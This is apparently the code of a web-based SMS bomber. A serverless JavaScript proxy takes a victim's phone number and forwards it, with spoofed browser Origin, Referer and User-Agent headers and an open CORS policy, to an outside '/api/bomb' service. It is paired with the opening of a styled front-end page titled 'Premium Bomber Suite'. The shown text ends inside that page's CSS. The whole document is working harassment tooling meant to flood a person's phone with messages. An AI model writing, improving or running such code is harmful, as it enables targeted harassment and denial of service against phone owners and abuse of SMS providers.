// language: javascript, file: api/smsb.js
// Proxy endpoint — forwards POST to source SMS API

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Cache-Control", "no-store");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ error: "POST only" });

  const body = req.body || {};
  const number = String(body.number || "").replace(/\D/g, "").slice(-10);
  if (number.length < 10) return res.status(400).json({ error: "bad number" });

  const payload = { number, mobile: number, phone: number, num: number };

  try {
    const r = await fetch("https://ayusmsapi.vercel.app/api/bomb", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        Accept: "application/json",
        Origin: "https://ayusmsapi.vercel.app",
        Referer: "https://ayusmsapi.vercel.app/",
        Connection: "keep-alive",
      },
      body: JSON.stringify(payload),
      cache: "no-store",
    });
    const text = await r.text();
    res.setHeader("Content-Type", "application/json");
    return res.status(r.status).send(text);
  } catch (e) {
    return res.status(502).json({ error: String(e.message || e) });
  }
}





index.html


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SMS-B — Premium Bomber Suite</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
<style>
:root {
  --bg: #05070d;
  --surface: #0a0f1c;
  --surface-2: #0f1626;
  --border: #1a2438;
  --border-bright: #2a3a55;
  --text: #e8edf5;
  --text-dim: #8892a6;
  --text-faint: #4a5568;
  --accent: #ff2e63;
  --accent-dim: #cc1f4e;
  --accent-glow: rgba(255, 46, 99, 0.15);
  --accent-glow-strong: rgba(255, 46, 99, 0.35);
  --gold: #ffb800;
  --ok: #00ff9d;
